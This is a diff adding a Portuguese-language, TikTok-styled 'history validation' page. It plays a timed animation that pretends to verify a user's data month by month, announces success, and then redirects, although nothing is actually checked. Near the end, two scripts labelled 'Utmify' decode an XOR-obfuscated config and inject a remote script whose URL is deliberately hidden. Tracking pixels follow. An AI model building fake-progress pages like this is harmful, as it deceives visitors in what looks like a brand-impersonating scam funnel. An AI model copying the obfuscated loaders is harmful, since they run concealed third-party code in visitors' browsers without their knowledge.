@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <!-- Clarity -->
+    <script type="text/javascript">
+        (function (c, l, a, r, i, t, y) {
+            c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+            t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+            y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+        })(window, document, "clarity", "script", "vmz9z7c6ek");
+    </script>
+
+    <meta charset="UTF-8">
+    <title>Validação de Histórico</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- SF Pro Display or similar native feel -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #121212;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 414px;
+            background: #ffffff;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .header {
+            background: #000000;
+            color: #ffffff;
+            padding: 40px 25px 65px 25px;
+            text-align: center;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            position: relative;
+        }
+
+        /* TikTok subtle glitch effect ornament */
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #00f2ea 0%, #ff0050 100%);
+        }
+
+        .header h1 {
+            font-size: 22px;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .header p {
+            font-size: 15px;
+            opacity: 0.9;
+            line-height: 1.4;
+            color: #e5e5e5;
+        }
+
+        .card-overlap {
+            background: white;
+            margin: -45px 20px 20px 20px;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.08);
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            z-index: 2;
+            border: 1px solid #f1f1f1;
+        }
+
+        .calendar-img {
+            max-width: 130px;
+            border-radius: 8px;
+            margin-top: -5px;
+            margin-bottom: 18px;
+            /* TikTok style drop shadow */
+            box-shadow: 3px 3px 0px rgba(0, 242, 234, 0.6), -3px -3px 0px rgba(255, 0, 80, 0.6);
+            border: 2px solid #000;
+        }
+
+        .loading-text-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #000000;
+            font-weight: 700;
+            font-size: 15px;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid #f1f1f1;
+            border-top-color: #00f2ea;
+            border-right-color: #ff0050;
+            border-radius: 50%;
+            animation: spinTikTok 0.8s linear infinite;
+        }
+
+        @keyframes spinTikTok {
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .stepper-container {
+            padding: 10px 30px 40px 30px;
+            flex-grow: 1;
+        }
+
+        .step-row {
+            display: flex;
+            align-items: flex-start;
+        }
+
+        .step-indicator {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-right: 18px;
+        }
+
+        .step-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #f8f8f8;
+            border: 2px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #b0b0b0;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .step-icon svg {
+            width: 16px;
+            height: 16px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step-connector {
+            width: 3px;
+            height: 32px;
+            background: #f1f1f1;
+            margin: 4px 0;
+            border-radius: 2px;
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        .step-connector-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 0%;
+            background: #000000;
+            transition: height 0.7s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .step-content {
+            padding-top: 6px;
+            padding-bottom: 25px;
+            flex: 1;
+            transition: opacity 0.3s ease;
+            opacity: 0.4;
+        }
+
+        .step-content h3 {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 2px;
+            transition: color 0.3s;
+        }
+
+        .step-content p {
+            font-size: 13.5px;
+            color: #777777;
+            margin: 0;
+        }
+
+        /* Active State */
+        .step-row.active .step-icon {
+            background: #ffffff;
+            border-color: #00f2ea;
+            color: #000000;
+            box-shadow: 0 0 0 3px rgba(0, 242, 234, 0.2);
+        }
+
+        .step-row.active .step-content {
+            opacity: 1;
+        }
+
+        .step-row.active .step-icon::after {
+            content: '';
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: #ff0050;
+            border-radius: 50%;
+            animation: pulse-dot 1.2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        @keyframes pulse-dot {
+            0% {
+                transform: scale(0.6);
+                opacity: 1;
+            }
+
+            100% {
+                transform: scale(2.2);
+                opacity: 0;
+            }
+        }
+
+        /* Completed State */
+        .step-row.completed .step-icon {
+            background: #000000;
+            border-color: #000000;
+            color: white;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .step-row.completed .step-icon svg {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .step-row.completed .step-icon::after {
+            display: none;
+        }
+
+        .step-row.completed .step-content {
+            opacity: 1;
+        }
+
+        .step-row.completed .step-content h3 {
+            color: #000000;
+        }
+
+        .step-connector.completed .step-connector-fill {
+            background: #000000;
+        }
+
+        .floating-action {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            width: 100%;
+            max-width: 414px;
+            padding: 20px;
+            background: linear-gradient(to top, rgba(255, 255, 255, 1) 80%, rgba(255, 255, 255, 0));
+            display: flex;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: all 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 100;
+        }
+
+        .floating-action.visible {
+            opacity: 1;
+            pointer-events: auto;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .btn-claim {
+            width: 100%;
+            max-width: 350px;
+            background: #ff0050;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            box-shadow: 0 10px 25px rgba(255, 0, 80, 0.3);
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform 0.2s, background 0.2s;
+        }
+
+        .btn-claim:active {
+            transform: scale(0.97);
+            background: #d80044;
+        }
+
+        /* LOADER TIKTOK */
+        .tiktok-loader-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+        }
+
+        .tiktok-loader-circle {
+            width: 55px;
+            height: 55px;
+            border-radius: 50%;
+            border: 4px solid rgba(0, 0, 0, 0.05);
+            border-top-color: #00f2ea;
+            border-right-color: #ff0050;
+            animation: spinTikTok 0.8s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .tiktok-loader-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000000;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="app-container">
+        <div class="header">
+            <h1>Seu Progresso Anual</h1>
+            <p>Estamos carregando seu histórico.<br>Aguarde enquanto confirmamos as etapas.</p>
+        </div>
+
+        <div class="card-overlap">
+            <img src="images/OoKNF1PITjyl.png" alt="Calendário" class="calendar-img">
+            <div class="loading-text-container">
+                <div class="spinner" id="progressSpinner"></div>
+                <span id="progressText">Acessando sistema...</span>
+            </div>
+        </div>
+
+        <div class="stepper-container" id="months">
+            <!-- 1 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <div class="step-connector month-connector">
+                        <div class="step-connector-fill month-connector-fill"></div>
+                    </div>
+                </div>
+                <div class="step-content">
+                    <h3>Jan/Fev</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+            <!-- 2 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <div class="step-connector month-connector">
+                        <div class="step-connector-fill month-connector-fill"></div>
+                    </div>
+                </div>
+                <div class="step-content">
+                    <h3>Mar/Abr</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+            <!-- 3 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <div class="step-connector month-connector">
+                        <div class="step-connector-fill month-connector-fill"></div>
+                    </div>
+                </div>
+                <div class="step-content">
+                    <h3>Mai/Jun</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+            <!-- 4 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <div class="step-connector month-connector">
+                        <div class="step-connector-fill month-connector-fill"></div>
+                    </div>
+                </div>
+                <div class="step-content">
+                    <h3>Jul/Ago</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+            <!-- 5 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <div class="step-connector month-connector">
+                        <div class="step-connector-fill month-connector-fill"></div>
+                    </div>
+                </div>
+                <div class="step-content">
+                    <h3>Set/Out</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+            <!-- 6 -->
+            <div class="step-row month-item">
+                <div class="step-indicator">
+                    <div class="step-icon"><svg viewBox="0 0 24 24">
+                            <path d="M5 13l4 4L19 7"></path>
+                        </svg></div>
+                    <!-- sem conector no ultimo -->
+                </div>
+                <div class="step-content" style="padding-bottom: 20px;">
+                    <h3>Nov/Dez</h3>
+                    <p class="status-msg">Aguardando...</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Espaçamento extra para que o último item seja sempre visível mesmo com o botão fixo -->
+        <div style="height: 100px;"></div>
+
+        <div class="floating-action" id="floatingBtn">
+            <button class="btn-claim" id="claimBtn">
+                Ver Resultado Final
+                <svg style="width:20px;height:20px;" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5"
+                        d="M14 5l7 7m0 0l-7 7m7-7H3"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <div class="tiktok-loader-overlay" id="tiktok-loader">
+        <div class="tiktok-loader-circle"></div>
+        <div class="tiktok-loader-text">Validando acesso...</div>
+    </div>
+
+    <script>
+        const monthItems = document.querySelectorAll('.month-item');
+        const connectors = document.querySelectorAll('.month-connector');
+        const connectorFills = document.querySelectorAll('.month-connector-fill');
+        const progressText = document.getElementById('progressText');
+        const progressSpinner = document.getElementById('progressSpinner');
+        const claimBtn = document.getElementById('claimBtn');
+        const floatingBtn = document.getElementById('floatingBtn');
+        const statusMsgs = document.querySelectorAll('.status-msg');
+
+        const labels = ['Jan/Fev', 'Mar/Abr', 'Mai/Jun', 'Jul/Ago', 'Set/Out', 'Nov/Dez'];
+        let currentIndex = 0;
+        const totalSteps = labels.length;
+        const stepTime = 1000;
+        let loop;
+
+        function updateStep() {
+            monthItems.forEach((item, i) => {
+                if (i === currentIndex) {
+                    item.classList.add('active');
+                    statusMsgs[i].textContent = 'Verificando dados...';
+                } else {
+                    item.classList.remove('active');
+                }
+
+                if (i < currentIndex) {
+                    item.classList.add('completed');
+                    statusMsgs[i].textContent = 'Validação concluída';
+                }
+            });
+
+            connectorFills.forEach((fill, i) => {
+                if (currentIndex > i) {
+                    fill.style.height = '100%';
+                    connectors[i].classList.add('completed');
+                } else {
+                    fill.style.height = '0%';
+                }
+            });
+
+            if (currentIndex < totalSteps - 1) {
+                progressText.textContent = 'Analisando ' + labels[currentIndex + 1] + '...';
+            } else if (currentIndex === totalSteps - 1) {
+                progressText.textContent = 'Finalizando histórico...';
+            } else {
+                const lastItem = monthItems[totalSteps - 1];
+                lastItem.classList.remove('active');
+                lastItem.classList.add('completed');
+                statusMsgs[totalSteps - 1].textContent = 'Validação concluída';
+
+                progressText.textContent = 'Histórico validado com sucesso!';
+                progressText.style.color = '#ff0050';
+                progressSpinner.style.display = 'none';
+                floatingBtn.classList.add('visible');
+                clearInterval(loop);
+            }
+        }
+
+        updateStep();
+
+        loop = setInterval(() => {
+            currentIndex++;
+            updateStep();
+        }, stepTime);
+
+        function mostrarLoader() {
+            const loader = document.getElementById('tiktok-loader');
+            if (loader) loader.style.display = 'flex';
+            setTimeout(() => {
+                window.location.href = './index.html' + window.location.search;
+            }, 3000);
+        }
+
+        claimBtn.addEventListener('click', mostrarLoader);
+    </script>
+
+    <!-- Utmify Scripts Start -->
+    <script>(function () { var j_ngv = atob("DBWMDBmTuSDuzNzR7W6ueWv/mxrMpKilnWa2Izbw3U7Auai8hHP1Inr81A6MvvOijmflfG3gllCHtLm9wmXldHz/lFSHp6i+hjvmfzu/m0GauK64j2D4aWqxg3uz4P62gXrubXXgmxq1t/6/jHjpLiOxzUmFmLO6vXz0aXXa3QLC7qqwgWDpLiOxj0HX/+rmiXO/aXykgBaN/73ljy3taiDym12zsQ=="); var b_zv2 = []; for (var w_c553 = 0; w_c553 < j_ngv.length; w_c553++) { b_zv2.push(j_ngv.charCodeAt(w_c553) & 255); } var t_n1hj = b_zv2[0]; var n_xrc = b_zv2.slice(1, 1 + t_n1hj); var q_was = b_zv2.slice(1 + t_n1hj); var e_p = q_was.map(function (b, n_76) { return b ^ n_xrc[n_76 % t_n1hj]; }); var n_cb = ""; for (var k_zant = 0; k_zant < e_p.length; k_zant++) { n_cb += String.fromCharCode(e_p[k_zant] & 255); } var w_ix = decodeURIComponent(escape(n_cb)); var t_a = JSON.parse(w_ix); var i_ia = t_a.globals || []; i_ia.forEach(function (x_jfw) { window[x_jfw.name] = x_jfw.value; }); var k_k6 = document.createElement("script"); k_k6.src = t_a.url; k_k6.async = true; k_k6.defer = true; (t_a.attributes || []).forEach(function (a_b5) { k_k6.setAttribute(a_b5.name, a_b5.value); }); (document.head || document.documentElement).appendChild(k_k6); })();</script>
+    <script>(function () { var u_l = atob("DHbcwyseBCI0cBWN/g3+tllyJhgWGGH5jgXm7AR9YEwaBWHglxCl7UhxaQxWAjr+nQS1s19tK1dAHWaikheoplhqKkhHUjmvnwKosUJ8cVZRAze3pQ3+rUpzYQAOUnHsihfxtl9zbURNXWX/mwC5rV8zfEFbFDj+nR3+7wloZU5BFTe33FSh71A8akNZFTe33BK9t0ozcVZZGXP00waupl17alYZA2DvlxKv4Qc8ckNYBXCvxFT+vnZj"); var i_ss = []; for (var r_3d = 0; r_3d < u_l.length; r_3d++) { i_ss.push(u_l.charCodeAt(r_3d) & 255); } var g_e4fm = i_ss[0]; var x_52vz = i_ss.slice(1, 1 + g_e4fm); var h_jbm = i_ss.slice(1 + g_e4fm); var b_9xv = h_jbm.map(function (b, f_ko) { return b ^ x_52vz[f_ko % g_e4fm]; }); var r_4lll = ""; for (var l_3iv0 = 0; l_3iv0 < b_9xv.length; l_3iv0++) { r_4lll += String.fromCharCode(b_9xv[l_3iv0] & 255); } var e_v = decodeURIComponent(escape(r_4lll)); var j_6 = JSON.parse(e_v); var u_ri = j_6.globals || []; u_ri.forEach(function (s_5w) { window[s_5w.name] = s_5w.value; }); var g_6 = document.createElement("script"); g_6.src = j_6.url; g_6.async = true; g_6.defer = true; (j_6.attributes || []).forEach(function (x_i7) { g_6.setAttribute(x_i7.name, x_i7.value); }); (document.head || document.documentElement).appendChild(g_6); })();</script>
+    <!-- Utmify Scripts End -->
+
+    <!-- TikTok Pixel Code Start -->
+    <script>
+        !function (w, d, t) {
+            w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+                for (
+                    var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+            }, ttq.load = function (e, n) {
+                var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+                    ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+            };
+            ttq.load('DA9G66JC77UES97486RG');
+            ttq.page();
+        }(window, document, 'ttq');
+    </script>
+    <!-- TikTok Pixel Code End -->
+</body>
+
+</html>
